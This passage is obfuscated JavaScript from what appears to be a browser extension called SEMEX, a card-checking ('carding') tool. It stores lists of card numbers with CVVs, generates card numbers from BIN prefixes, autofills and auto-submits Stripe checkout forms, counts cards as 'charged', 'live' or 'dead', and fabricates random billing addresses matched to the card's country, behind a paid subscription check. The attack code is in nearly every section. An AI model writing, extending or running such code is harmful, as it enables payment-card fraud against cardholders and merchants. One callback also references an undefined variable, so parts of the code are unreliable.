        const _0xbfcffc = _0x2de2e3.settings || DEFAULT_SETTINGS;
        _0xbfcffc.binOrCCList = _0xbfcffc.binOrCCList || {};
        const _0x5d30ca = _0xbfcffc.binOrCCList.ccList || "";
        const _0x5147c2 = _0x5d30ca ? _0x5d30ca + "\n" + _cardText : _cardText;
        _0xbfcffc.binOrCCList.ccList = _0x5147c2;
        chrome.storage.local.set({
          settings: _0xbfcffc
        }, () => _qres());
      });
    })).catch(() => {});
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_GET_LOGO_URL") {
    try {
      window.postMessage({
        type: "SEMEX_LOGO_URL",
        url: chrome.runtime.getURL("icons/logo.png")
      }, "*");
    } catch (_0xlogoErr) {}
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_GET_GLOBAL_STATS") {
    chrome.storage.local.get(["statistics"], _0x52cf95 => {
      const _0x66994c = _0x52cf95.statistics || {
        totalCards: 0,
        charged: 0,
        ccnLive: 0,
        dead: 0
      };
      window.postMessage({
        type: "SEMEX_GLOBAL_STATS_RESULT",
        stats: _0x66994c
      }, "*");
    });
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_GET_NEXT_CARD") {
    chrome.storage.local.get(["settings"], _0x56d5b7 => {
      var _0x5acabc;
      var _0x23e7d0;
      var _0x499695;
      const _0x1ecf7c = _0x56d5b7.settings || DEFAULT_SETTINGS;
      const _0x1ca684 = ((_0x5acabc = _0x1ecf7c.binOrCCList) == null ? undefined : _0x5acabc.mode) || "bin";
      let _0x4fc824 = null;
      if (_0x1ca684 === "ccList") {
        const _0x3d0bc2 = ((_0x23e7d0 = _0x1ecf7c.binOrCCList) == null ? undefined : _0x23e7d0.ccList) || "";
        const _0x571d70 = _0x3d0bc2.split("\n").filter(_0x55a8cb => _0x55a8cb.trim().length > 0);
        if (_0x571d70.length > 0) {
          const _0x1f79f9 = _0x571d70[0].split("|");
          if (_0x1f79f9.length >= 4) {
            _0x4fc824 = {
              number: _0x1f79f9[0].trim(),
              month: _0x1f79f9[1].trim(),
              year: _0x1f79f9[2].trim(),
              cvv: _0x1f79f9[3].trim()
            };
          }
        }
      } else {
        const _0x242f4f = ((_0x499695 = _0x1ecf7c.binOrCCList) == null ? undefined : _0x499695.bin) || "";
        // card-generator.js exposes a window.CardGenerator NAMESPACE and used to
        // load only in the MAIN world — both made the old bare-global check here
        // always false, so generation silently failed and fills used the demo
        // card. And generateCardFromBIN returns a bare PAN STRING; the fill path
        // needs the full card object, so use generateCard(bin, len, m, y, cvv).
        const _genCard = (typeof window.CardGenerator !== "undefined" && window.CardGenerator && typeof window.CardGenerator.generateCard === "function")
          ? window.CardGenerator.generateCard
          : null;
        if (_0x242f4f.length >= 6 && _genCard) {
          // Pinned CVV/expiry from the overlay BIN switcher (stored by
          // SEMEX_SET_ACTIVE_BIN). Validate first — a malformed pin falls back
          // to the generated value instead of corrupting the card.
          let _pinCvv = "";
          const _rawCvv = _0x1ecf7c.binOrCCList && _0x1ecf7c.binOrCCList.cvv;
          if (_rawCvv) {
            const _c = String(_rawCvv).replace(/\D/g, "");
            if (_c.length === 3 || _c.length === 4) _pinCvv = _c;
          }
          let _pinM = "RND", _pinY = "RND";
          const _rawExp = _0x1ecf7c.binOrCCList && _0x1ecf7c.binOrCCList.expiry;
          if (_rawExp && _rawExp.month) {
            const _m = parseInt(String(_rawExp.month).replace(/\D/g, ""), 10);
            if (_m >= 1 && _m <= 12) _pinM = String(_m).padStart(2, "0");
          }
          if (_rawExp && _rawExp.year) {
            let _y = String(_rawExp.year).replace(/\D/g, "");
            if (_y.length === 2) _y = "20" + _y;
            const _yn = parseInt(_y, 10);
            const _yNow = new Date().getFullYear();
            if (_y.length === 4 && _yn >= _yNow && _yn <= _yNow + 30) _pinY = _y;
          }
          // Detect correct card length from BIN prefix: AMEX (34/37) = 15 digits,
          // everything else = 16. Passing 16 for AMEX produces an invalid number.
          const _semexBinDigits = _0x242f4f.replace(/\D/g, "");
          const _semexIsAmex = _semexBinDigits.startsWith("34") || _semexBinDigits.startsWith("37");
          const _semexCardLen = _semexIsAmex ? 15 : 16;
          _0x4fc824 = _genCard(_0x242f4f, _semexCardLen, _pinM, _pinY, _pinCvv);
        }
      }
      window.postMessage({
        type: "SEMEX_NEXT_CARD_RESULT",
        card: _0x4fc824
      }, "*");
    });
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_FILL_FORM") {
    fillFormFromOverlay(_0x2021de.data.card);
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_TRIGGER_SUBMIT") {
    // New Stripe checkout UI (/g/pay/, /c/pay/ on checkout.stripe.com): the
    // submit button lives inside the cross-origin js.stripe.com iframe — querying
    // document from the top frame finds nothing and submit silently never fires.
    // Route via background so the iframe's content script can click it there.
    const _semexIsNewUISubmit = IS_MAIN_FRAME && (
      window.location.pathname.startsWith("/g/pay/") ||
      (window.location.hostname === "checkout.stripe.com" && window.location.pathname.startsWith("/c/pay/"))
    );
    // Merchant-embedded Stripe: detect if the page has an elements-inner or
    // embedded-checkout-inner cross-origin iframe. Stripe Embedded Checkout
    // keeps its Pay button INSIDE the embedded-checkout-inner iframe, so we
    // must send TRIGGER_SUBMIT_SUBFRAMES there. Stripe Payment Element puts the
    // Pay button in the merchant's own DOM, so we ALSO run top-frame
    // triggerStripeValidation() in parallel as a safe fallback.
    const _semexHasStripeCheckoutFrame = IS_MAIN_FRAME && Array.from(document.querySelectorAll("iframe")).some(function(_semexSfrEl) {
      const _semexSfrSrc = _semexSfrEl.src || "";
      return _semexSfrSrc.includes("js.stripe.com") && (
        _semexSfrSrc.includes("elements-inner") || _semexSfrSrc.includes("embedded-checkout-inner")
      );
    });
    if (_semexIsNewUISubmit) {
      safeSendMessage({ type: "TRIGGER_SUBMIT_SUBFRAMES" });
    } else if (_semexHasStripeCheckoutFrame) {
      // Dual-path: subframes covers embedded-checkout-inner's own submit button;
      // top-frame covers the merchant's wrapper Pay button (Payment Element).
      safeSendMessage({ type: "TRIGGER_SUBMIT_SUBFRAMES" });
      triggerStripeValidation().then(() => {}).catch(_0x19667e => {});
    } else {
      triggerStripeValidation().then(() => {}).catch(_0x19667e => {});
    }
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_REMOVE_CARD") {
    const _0x1bf695 = _0x2021de.data.card;
    if (_0x1bf695 && _0x1bf695.number) {
      chrome.storage.local.get(["settings"], _0x3c5d85 => {
        var _0x2d612e;
        const _0x3be6d6 = _0x3c5d85.settings || DEFAULT_SETTINGS;
        const _0x41b05d = ((_0x2d612e = _0x3be6d6.binOrCCList) == null ? undefined : _0x2d612e.ccList) || "";
        const _0xd21d57 = _0x41b05d.split("\n").filter(_0x624d95 => _0x624d95.trim().length > 0);
        // Remove only the FIRST line whose card-number digits match.
        // Using filter() here would silently drop every duplicate line with the
        // same number, so use findIndex + splice for a first-match-only removal.
        const _0xCardNum = String(_0x1bf695.number).replace(/\D/g, "");
        const _0xFirstIdx = _0xd21d57.findIndex(_0xl =>
          String(_0xl).split("|")[0].replace(/\D/g, "") === _0xCardNum
        );
        const _0x2b94c6 = _0xd21d57.slice();
        if (_0xFirstIdx !== -1) _0x2b94c6.splice(_0xFirstIdx, 1);
        _0x3be6d6.binOrCCList.ccList = _0x2b94c6.join("\n");
        chrome.storage.local.set({ settings: _0x3be6d6 }, () => {
          // Sync the overlay's MAIN-world settings cache so the picker label
          // immediately shows the next card instead of the just-removed one.
          try {
            window.postMessage({ type: "SEMEX_SETTINGS_UPDATE", settings: _0x3be6d6 }, "*");
          } catch (_eSyncErr) {}
        });
      });
    }
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_REQUEST_SETTINGS") {
    chrome.storage.local.get(["settings"], _0x34b5b0 => {
      const _0x3e972a = _0x34b5b0.settings || DEFAULT_SETTINGS;
      window.postMessage({
        type: "SEMEX_SETTINGS_UPDATE",
        settings: _0x3e972a
      }, "*");
    });
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_GET_SAVED_BINS") {
    // Helper: mark the bridge as API-dead so the overlay heartbeat check
    // knows the chrome context is invalidated even though the JS timer still runs.
    function _semexMarkCtxInvalid() {
      // Terminal: prevent any subsequent heartbeat tick from overwriting this.
      _semexBridgeInvalidated = true;
      try { document.documentElement.setAttribute("data-semex-bridge", "invalidated"); } catch (_e) {}
    }
    function _semexIsCtxErr(_0xstr) {
      return String(_0xstr || "").toLowerCase().indexOf("invalidated") !== -1;
    }
    try {
      chrome.runtime.sendMessage({ type: "SEMEX_GET_SAVED_BINS" }, _semexBinsResp => {
        try {
          const _0xlastErr = chrome.runtime.lastError;
          if (_0xlastErr) {
            const _0xctx = _semexIsCtxErr(_0xlastErr.message);
            if (_0xctx) _semexMarkCtxInvalid();
            window.postMessage({
              type: "SEMEX_SAVED_BINS_RESULT",
              ok: false,
              bins: [],
              error: _0xctx ? "context_invalidated" : String(_0xlastErr.message || _0xlastErr)
            }, "*");
            return;
          }
          if (!_semexBinsResp) {
            window.postMessage({ type: "SEMEX_SAVED_BINS_RESULT", ok: false, bins: [], error: null }, "*");
            return;
          }
          window.postMessage({
            type: "SEMEX_SAVED_BINS_RESULT",
            ok: !!_semexBinsResp.ok,
            bins: _semexBinsResp.bins || [],
            error: _semexBinsResp.error || null
          }, "*");
        } catch (_semexBinsCbErr) {
          const _0xctx2 = _semexIsCtxErr(_semexBinsCbErr && _semexBinsCbErr.message);
          if (_0xctx2) _semexMarkCtxInvalid();
          window.postMessage({
            type: "SEMEX_SAVED_BINS_RESULT",
            ok: false,
            bins: [],
            error: _0xctx2 ? "context_invalidated" : String((_semexBinsCbErr && _semexBinsCbErr.message) || _semexBinsCbErr)
          }, "*");
        }
      });
    } catch (_semexBinsErr) {
      const _0xctx3 = _semexIsCtxErr(_semexBinsErr && _semexBinsErr.message);
      if (_0xctx3) _semexMarkCtxInvalid();
      window.postMessage({
        type: "SEMEX_SAVED_BINS_RESULT",
        ok: false,
        bins: [],
        error: _0xctx3 ? "context_invalidated" : String((_semexBinsErr && _semexBinsErr.message) || _semexBinsErr)
      }, "*");
    }
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_GET_BIN_INFO") {
    const _semexBin6 = String(_0x2021de.data.bin6 || "").replace(/\D/g, "").slice(0, 8);
    try {
      chrome.runtime.sendMessage({ type: "SEMEX_GET_BIN_INFO", bin6: _semexBin6 }, _semexBinInfoResp => {
        const _r = chrome.runtime.lastError || !_semexIpResp ? { ok: false } : _semexIpResp;
        window.postMessage({
          type: "SEMEX_BIN_INFO_RESULT", bin6: _semexBin6,
          ok: !!_r.ok, brand: _r.brand || null, cardType: _r.cardType || null, level: _r.level || null,
          bank: _r.bank || null, country: _r.country || null, countryCode: _r.countryCode || null, error: _r.error || null
        }, "*");
      });
    } catch (_e) {
      window.postMessage({ type: "SEMEX_BIN_INFO_RESULT", bin6: _semexBin6, ok: false, error: String(_e) }, "*");
    }
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_GET_IP") {
    try {
      chrome.runtime.sendMessage({ type: "SEMEX_GET_IP" }, _semexIpResp => {
        const _r = chrome.runtime.lastError || !_semexIpResp ? { ok: false } : _semexIpResp;
        window.postMessage({
          type: "SEMEX_IP_RESULT",
          ok: !!_r.ok, ip: _r.ip || null, country: _r.country || null,
          countryCode: _r.countryCode || null, latency: _r.latency || null, error: _r.error || null
        }, "*");
      });
    } catch (_e) {
      window.postMessage({ type: "SEMEX_IP_RESULT", ok: false, error: String(_e) }, "*");
    }
  }
  // Address mode setting: get/set from overlay settings panel
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_GET_ADDR_MODE") {
    try {
      chrome.storage.local.get(["settings"], _semexAmRes => {
        const _semexAmS = (_semexAmRes && _semexAmRes.settings) || {};
        window.postMessage({ type: "SEMEX_ADDR_MODE", mode: _semexAmS.addressMode || "bin" }, "*");
      });
    } catch (_semexAmE) {
      window.postMessage({ type: "SEMEX_ADDR_MODE", mode: "bin" }, "*");
    }
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_SET_ADDR_MODE") {
    try {
      const _semexAmMode = ["bin","ip","random","custom"].includes(_0x2021de.data.mode) ? _0x2021de.data.mode : "bin";
      chrome.storage.local.get(["settings"], _semexAmRes2 => {
        const _semexAmS2 = (_semexAmRes2 && _semexAmRes2.settings) || {};
        _semexAmS2.addressMode = _semexAmMode;
        chrome.storage.local.set({ settings: _semexAmS2 });
      });
    } catch (_semexAmE2) {}
  }
  // Custom billing country (Pixel Zero "Keep Country" parity) — 2-letter ISO,
  // persisted in settings.customCountryCode, used when addressMode==="custom".
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_SET_CUSTOM_COUNTRY") {
    try {
      const _semexCc = String(_0x2021de.data.code || "").toUpperCase().replace(/[^A-Z]/g, "").slice(0, 2);
      chrome.storage.local.get(["settings"], _semexCcRes => {
        const _semexCcS = (_semexCcRes && _semexCcRes.settings) || {};
        _semexCcS.customCountryCode = _semexCc;
        chrome.storage.local.set({ settings: _semexCcS });
      });
    } catch (_semexCcE) {}
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_GET_CUSTOM_COUNTRY") {
    try {
      chrome.storage.local.get(["settings"], _semexCcRes2 => {
        const _semexCcS2 = (_semexCcRes2 && _semexCcRes2.settings) || {};
        window.postMessage({ type: "SEMEX_CUSTOM_COUNTRY", code: _semexCcS2.customCountryCode || "" }, "*");
      });
    } catch (_semexCcE2) {
      window.postMessage({ type: "SEMEX_CUSTOM_COUNTRY", code: "" }, "*");
    }
  }
  // v4.0: overlay BIN/CC segmented mode toggle — persist mode locally only
  // (binOrCCList must NEVER sync to the backend).
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_SET_LIST_MODE") {
    try {
      const _semexMode = _0x2021de.data.mode === "ccList" ? "ccList" : "bin";
      chrome.storage.local.get(["settings"], _semexModeRes => {
        try {
          if (chrome.runtime.lastError) {
            window.postMessage({
              type: "SEMEX_SET_LIST_MODE_ERROR",
              error: String((chrome.runtime.lastError && chrome.runtime.lastError.message) || chrome.runtime.lastError)
            }, "*");
            return;
          }
          const _semexModeS = _semexModeRes.settings || DEFAULT_SETTINGS;
          _semexModeS.binOrCCList = _semexModeS.binOrCCList || {};
          _semexModeS.binOrCCList.mode = _semexMode;
          chrome.storage.local.set({ settings: _semexModeS }, () => {
            try {
              if (chrome.runtime.lastError) {
                window.postMessage({
                  type: "SEMEX_SET_LIST_MODE_ERROR",
                  error: String((chrome.runtime.lastError && chrome.runtime.lastError.message) || chrome.runtime.lastError)
                }, "*");
                return;
              }
              window.postMessage({
                type: "SEMEX_SETTINGS_UPDATE",
                settings: _semexModeS
              }, "*");
            } catch (_semexSetModeSetErr) {
              window.postMessage({ type: "SEMEX_SET_LIST_MODE_ERROR", error: String(_semexSetModeSetErr) }, "*");
            }
          });
        } catch (_semexGetModeErr) {
          window.postMessage({ type: "SEMEX_SET_LIST_MODE_ERROR", error: String(_semexGetModeErr) }, "*");
        }
      });
    } catch (_semexModeSyncErr) {
      window.postMessage({ type: "SEMEX_SET_LIST_MODE_ERROR", error: String(_semexModeSyncErr) }, "*");
    }
  }
  // v4.0: overlay CC picker — activate a card from the local ccList by
  // rotating it to the top; stored locally only, same as the dashboard.
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_SET_CC_ACTIVE") {
    try {
      const _semexCc = String(_0x2021de.data.ccList || "").slice(0, 20000);
      chrome.storage.local.get(["settings"], _semexCcRes => {
        try {
          if (chrome.runtime.lastError) {
            window.postMessage({
              type: "SEMEX_SET_CC_ACTIVE_ERROR",
              error: String((chrome.runtime.lastError && chrome.runtime.lastError.message) || chrome.runtime.lastError)
            }, "*");
            return;
          }
          const _semexCcS = _semexCcRes.settings || DEFAULT_SETTINGS;
          _semexCcS.binOrCCList = _semexCcS.binOrCCList || {};
          _semexCcS.binOrCCList.mode = "ccList";
          _semexCcS.binOrCCList.ccList = _semexCc;
          chrome.storage.local.set({ settings: _semexCcS }, () => {
            try {
              if (chrome.runtime.lastError) {
                window.postMessage({
                  type: "SEMEX_SET_CC_ACTIVE_ERROR",
                  error: String((chrome.runtime.lastError && chrome.runtime.lastError.message) || chrome.runtime.lastError)
                }, "*");
                return;
              }
              window.postMessage({
                type: "SEMEX_SETTINGS_UPDATE",
                settings: _semexCcS
              }, "*");
              window.postMessage({
                type: "SEMEX_ACTIVE_BIN_SET",
                ok: true,
                bin: ""
              }, "*");
            } catch (_semexCcSetErr) {
              window.postMessage({ type: "SEMEX_SET_CC_ACTIVE_ERROR", error: String(_semexCcSetErr) }, "*");
            }
          });
        } catch (_semexCcGetErr) {
          window.postMessage({ type: "SEMEX_SET_CC_ACTIVE_ERROR", error: String(_semexCcGetErr) }, "*");
        }
      });
    } catch (_semexCcSyncErr) {
      window.postMessage({ type: "SEMEX_SET_CC_ACTIVE_ERROR", error: String(_semexCcSyncErr) }, "*");
    }
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_SET_ACTIVE_BIN") {
    try {
      const _semexSetBin = String(_0x2021de.data.bin || "").replace(/\D/g, "").slice(0, 19);
      const _semexSetCvv = _0x2021de.data.cvv ? String(_0x2021de.data.cvv).replace(/\D/g, "").slice(0, 4) : "";
      const _semexSetExp = String(_0x2021de.data.expiry || "").trim();
      chrome.storage.local.get(["settings"], _semexSetRes => {
        try {
          if (chrome.runtime.lastError) {
            window.postMessage({
              type: "SEMEX_SET_ACTIVE_BIN_ERROR",
              error: String((chrome.runtime.lastError && chrome.runtime.lastError.message) || chrome.runtime.lastError)
            }, "*");
            return;
          }
          const _semexSetS = _semexSetRes.settings || DEFAULT_SETTINGS;
          _semexSetS.binOrCCList = _semexSetS.binOrCCList || {};
          _semexSetS.binOrCCList.mode = "bin";
          _semexSetS.binOrCCList.bin = _semexSetBin;
          if (_semexSetCvv) {
            _semexSetS.binOrCCList.cvv = _semexSetCvv;
          } else {
            // Switching to an entry without a pinned CVV must CLEAR the old
            // pin — otherwise the previous BIN's CVV leaks onto the new card.
            delete _semexSetS.binOrCCList.cvv;
          }
          if (_semexSetExp) {
            const _semexExpParts = _semexSetExp.split(/[\/\-\s]+/).filter(_0xp => _0xp.length);
            if (_semexExpParts.length >= 2) {
              _semexSetS.binOrCCList.expiry = _semexSetS.binOrCCList.expiry || {};
              _semexSetS.binOrCCList.expiry.month = _semexExpParts[0].replace(/\D/g, "").padStart(2, "0").slice(0, 2);
              let _semexExpYear = _semexExpParts[1].replace(/\D/g, "");
              if (_semexExpYear.length === 2) {
                _semexExpYear = "20" + _semexExpYear;
              }
              _semexSetS.binOrCCList.expiry.year = _semexExpYear;
            }
          } else {
            // No pinned expiry on this entry — clear any stale one too.
            delete _semexSetS.binOrCCList.expiry;
          }
          chrome.storage.local.set({ settings: _semexSetS }, () => {
            try {
              if (chrome.runtime.lastError) {
                window.postMessage({
                  type: "SEMEX_SET_ACTIVE_BIN_ERROR",
                  error: String((chrome.runtime.lastError && chrome.runtime.lastError.message) || chrome.runtime.lastError)
                }, "*");
                return;
              }
              window.postMessage({
                type: "SEMEX_SETTINGS_UPDATE",
                settings: _semexSetS
              }, "*");
              window.postMessage({
                type: "SEMEX_ACTIVE_BIN_SET",
                ok: true,
                bin: _semexSetBin
              }, "*");
            } catch (_semexBinSetErr) {
              window.postMessage({ type: "SEMEX_SET_ACTIVE_BIN_ERROR", error: String(_semexBinSetErr) }, "*");
            }
          });
        } catch (_semexBinGetErr) {
          window.postMessage({ type: "SEMEX_SET_ACTIVE_BIN_ERROR", error: String(_semexBinGetErr) }, "*");
        }
      });
    } catch (_semexBinSyncErr) {
      window.postMessage({ type: "SEMEX_SET_ACTIVE_BIN_ERROR", error: String(_semexBinSyncErr) }, "*");
    }
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_GET_BLUR_STATE") {
    chrome.storage.local.get(["__xsmbe"], _0xe582ea => {
      // v4.0 fix: the storage key IS "__xsmbe", so read that property — not
      // the old "semexSmartBlurEnabled" key which is never written.
      window.postMessage({
        type: "SEMEX_BLUR_STATE_RESULT",
        enabled: _0xe582ea.__xsmbe === true
      }, "*");
    });
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_CHECK_SUBSCRIPTION") {
    safeSendMessage({
      type: "VERIFY_SESSION"
    }).then(_0x4a2c69 => {
      var _0x5bb460;
      const _0x1167af = (_0x4a2c69 == null ? undefined : _0x4a2c69.valid) === true && ((_0x5bb460 = _0x4a2c69 == null ? undefined : _0x4a2c69.user) == null ? undefined : _0x5bb460.status) !== "banned";
      window.postMessage({
        type: "SEMEX_SUBSCRIPTION_STATUS",
        valid: _0x1167af,
        reason: (_0x4a2c69 == null ? undefined : _0x4a2c69.reason) || (_0x4a2c69 === null ? "extension_reloaded" : null)
      }, "*");
    });
  }
  if (_0x2021de.data && _0x2021de.data.type === "SEMEX_TOGGLE_BLUR_STYLES") {
    const _0x9ffdfe = _0x2021de.data.enabled;
    // v4.0 fix: persist so SEMEX_GET_BLUR_STATE on the next page load
    // can restore the correct state (previously only broadcast, never saved).
    chrome.storage.local.set({ __xsmbe: !!_0x9ffdfe });
    safeSendMessage({
      type: "SEMEX_BROADCAST_BLUR",
      enabled: _0x9ffdfe
    });
    applySmartBlur(_0x9ffdfe);
  }
});
// Watch for REAL typing in card fields (number / expiry / cvv) and tell the
// background worker this tab has genuine card activity. The background's
// false-charged guard drops forwardable hits unless a fill was marked recently
// — previously only overlay autofill counted, so fully manual checkouts were
// silently dropped (no screenshot, no submit, no badge).
(function _semexWatchCardFields() {
  let _lastSent = 0;
  function _looksCardField(el) {
    try {
      if (!el || el.tagName !== "INPUT") return false;
      const s = [el.name, el.id, el.autocomplete, el.placeholder, el.getAttribute && el.getAttribute("data-field"), el.getAttribute && el.getAttribute("aria-label")].join(" ").toLowerCase();
      if (/email|tel|phone|zip|postal|address|holder|quantity|qty|search/.test(s)) return false;
      return /card|cc-|\bcvc\b|\bcvv\b|expir|number/.test(s);
    } catch (_) { return false; }
  }
  document.addEventListener("input", function (e) {
    try {
      if (!_looksCardField(e.target)) return;
      const now = Date.now();
      if (now - _lastSent < 3000) return;
      _lastSent = now;
      if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
        chrome.runtime.sendMessage({ type: "SEMEX_CARD_ACTIVITY" }).catch(() => {});
      }
    } catch (_) {}
  }, true);
})();
let lastFormFillTime = 0;
const FORM_FILL_DEBOUNCE = 2000;
// ── Random address generator ─────────────────────────────────────────────────
// Returns a random billing address object for the given ISO country code.
// Country priority used by callers: BIN card country → addressCountry setting → US.
function _semexGenRandomAddress(_targetCountry) {
  const _rnd = _arr => _arr[Math.floor(Math.random() * _arr.length)];
  const _rndN = (_mn, _mx) => Math.floor(Math.random() * (_mx - _mn + 1)) + _mn;
  const _POOLS = {
    US: {
      streets: ["Main St","Oak Ave","Maple Dr","Cedar Ln","Pine Blvd","Elm St","Washington Ave","Park Rd","Lake Dr","River Rd","Hill St","Valley Rd","Forest Dr","Sunset Blvd","Spring St","Meadow Ln","Willow Way","Highland Ave","Woodland Dr","Jefferson Ave","Broadway","Lincoln Ave","Adams St","Madison Blvd","Monroe Dr"],
      cities: [["New York","NY"],["Los Angeles","CA"],["Chicago","IL"],["Houston","TX"],["Phoenix","AZ"],["Philadelphia","PA"],["San Antonio","TX"],["San Diego","CA"],["Dallas","TX"],["Austin","TX"],["Denver","CO"],["Seattle","WA"],["Nashville","TN"],["Miami","FL"],["Atlanta","GA"],["Minneapolis","MN"],["Portland","OR"],["Las Vegas","NV"],["Boston","MA"],["Charlotte","NC"],["Detroit","MI"],["Memphis","TN"],["Louisville","KY"],["Baltimore","MD"],["Milwaukee","WI"]],
      zip: () => String(_rndN(10000, 99999))
    },
    GB: {
      streets: ["High Street","Church Lane","Station Road","Victoria Street","Kings Road","Park Lane","Mill Road","Manor Drive","Maple Close","Oak Road","Bridge Street","Garden Street","Castle Street","Market Street","George Street","Queen Street","Albert Road","London Road","Windsor Avenue","Regent Street"],
      cities: [["London",""],["Manchester",""],["Birmingham",""],["Leeds",""],["Glasgow",""],["Liverpool",""],["Edinburgh",""],["Bristol",""],["Sheffield",""],["Cardiff",""],["Leicester",""],["Coventry",""],["Bradford",""],["Nottingham",""],["Kingston upon Hull",""]],
      zip: () => { const a="ABCDEFGHJKLMNOPRSTUVWXY",d="0123456789"; return a[_rndN(0,a.length-1)]+d[_rndN(0,9)]+d[_rndN(0,9)]+" "+d[_rndN(0,9)]+a[_rndN(0,a.length-1)]+a[_rndN(0,a.length-1)]; }
    },
    CA: {
      streets: ["Yonge St","Queen St","King St","Bloor St","Spadina Ave","Bay St","College St","Dundas St","Bathurst St","Avenue Rd","Main St","Oak Ave","Maple Ave","Pine St","Cedar Rd","Wellington St","Rideau St","Jasper Ave","Granville St","Robson St"],
      cities: [["Toronto","ON"],["Vancouver","BC"],["Montreal","QC"],["Calgary","AB"],["Ottawa","ON"],["Edmonton","AB"],["Winnipeg","MB"],["Quebec City","QC"],["Hamilton","ON"],["Brampton","ON"],["Surrey","BC"],["Laval","QC"],["Halifax","NS"],["London","ON"],["Markham","ON"]],
      zip: () => { const l="ABCEGHJKLMNPRSTVXY",d="0123456789"; return l[_rndN(0,l.length-1)]+d[_rndN(0,9)]+l[_rndN(0,l.length-1)]+" "+d[_rndN(0,9)]+l[_rndN(0,l.length-1)]+d[_rndN(0,9)]; }
    },
    AU: {
      streets: ["George St","King St","Queen St","Elizabeth St","Pitt St","Collins St","Bourke St","Swanston St","Murray St","Hay St","Main St","Oak Ave","Maple Dr","Cedar Rd","Pine Ave","Hunter St","Pirie St","Rundle Mall","Northbourne Ave","St Georges Terrace"],
      cities: [["Sydney","NSW"],["Melbourne","VIC"],["Brisbane","QLD"],["Perth","WA"],["Adelaide","SA"],["Gold Coast","QLD"],["Canberra","ACT"],["Hobart","TAS"],["Darwin","NT"],["Newcastle","NSW"],["Wollongong","NSW"],["Logan City","QLD"],["Geelong","VIC"],["Townsville","QLD"],["Cairns","QLD"]],
      zip: () => String(_rndN(2000, 7999))
    },
    DE: {
      streets: ["Hauptstraße","Bahnhofstraße","Schulstraße","Gartenstraße","Dorfstraße","Kirchstraße","Bergstraße","Waldstraße","Wiesenstraße","Lindenstraße","Mozartstraße","Schillerstraße","Goethestraße","Beethovenstraße","Rathausplatz","Bismarckstraße","Friedrichstraße","Kaiserstraße","Wilhelmstraße","Marktplatz"],
      cities: [["Berlin",""],["Hamburg",""],["Munich",""],["Cologne",""],["Frankfurt",""],["Stuttgart",""],["Düsseldorf",""],["Leipzig",""],["Dortmund",""],["Essen",""],["Bremen",""],["Dresden",""],["Hannover",""],["Nuremberg",""],["Duisburg",""]],
      zip: () => String(_rndN(10115, 99998))
    },
    FR: {
      streets: ["Rue de la Paix","Avenue des Champs-Élysées","Rue du Faubourg","Boulevard Haussmann","Rue de Rivoli","Avenue Montaigne","Rue Saint-Honoré","Boulevard Saint-Germain","Rue du Commerce","Rue de la République","Place de la Bastille","Avenue Victor Hugo","Rue du Bac","Rue Oberkampf","Boulevard Voltaire","Rue de la Liberté","Avenue Jean Jaurès","Rue Gambetta","Rue Nationale","Boulevard de la Liberté"],
      cities: [["Paris",""],["Marseille",""],["Lyon",""],["Toulouse",""],["Nice",""],["Nantes",""],["Strasbourg",""],["Montpellier",""],["Bordeaux",""],["Lille",""],["Rennes",""],["Reims",""],["Le Havre",""],["Toulon",""],["Grenoble",""]],
      zip: () => String(_rndN(75001, 96999))
    },
    NL: {
      streets: ["Keizersgracht","Herengracht","Prinsengracht","Kalverstraat","Leidsestraat","Damrak","Rokin","Spui","Nieuwezijds Voorburgwal","Overtoom","Reguliersbreestraat","Utrechtsestraat","Vijzelstraat","Rembrandtplein","Vondelpark"],
      cities: [["Amsterdam",""],["Rotterdam",""],["The Hague",""],["Utrecht",""],["Eindhoven",""],["Tilburg",""],["Groningen",""],["Almere",""],["Breda",""],["Nijmegen",""]],
      zip: () => String(_rndN(1000, 9999)) + " " + String.fromCharCode(65+_rndN(0,25)) + String.fromCharCode(65+_rndN(0,25))
    },
    IN: {
      streets: ["MG Road","Brigade Road","Residency Road","Linking Road","Bandra Kurla Complex","Park Street","Anna Salai","Mount Road","Necklace Road","Sardar Patel Marg","Connaught Place","Janpath","Barakhamba Road","Rajiv Chowk","Chandni Chowk"],
      cities: [["Mumbai","MH"],["Delhi","DL"],["Bangalore","KA"],["Hyderabad","TG"],["Chennai","TN"],["Kolkata","WB"],["Pune","MH"],["Ahmedabad","GJ"],["Surat","GJ"],["Jaipur","RJ"]],
      zip: () => String(_rndN(110001, 999999))
    }
  };
  const _tc = String(_targetCountry || "US").toUpperCase().replace("UK","GB");
  const _pool = _POOLS[_tc] || _POOLS.US;
  const _streetNum = _rndN(1, 9999);
  const _street = _rnd(_pool.streets);
  const _cityEntry = _rnd(_pool.cities);
  const _city = _cityEntry[0], _state = _cityEntry[1];
  const _zip = _pool.zip();
  return { address: _streetNum + " " + _street, address2: "", city: _city, state: _state, zip: _zip, country: _tc, countryCode: _tc };
}
__name(_semexGenRandomAddress, "_semexGenRandomAddress");

async function fillFormFromOverlay(_0x395d27) {
  // v2.3.6 lock: refuse to fill anything if server flagged this extension as
  // outdated. Also renders a persistent on-page banner so the user sees the
  // block on the actual checkout page (not just the popup).
  try {
    // TIMEOUT GUARD: if the storage API stalls in this frame the fill must not
    // hang on "Filling form..." — proceed without the upgrade flag.
    const _semexUp = await Promise.race([
      Promise.resolve().then(() => chrome.storage.local.get(["__xugr"])).catch(() => null),
      new Promise(_r => setTimeout(() => _r(null), 1500))
    ]);
    if (_semexUp && _semexUp.semexUpgradeRequired && _semexUp.semexUpgradeRequired.required) {
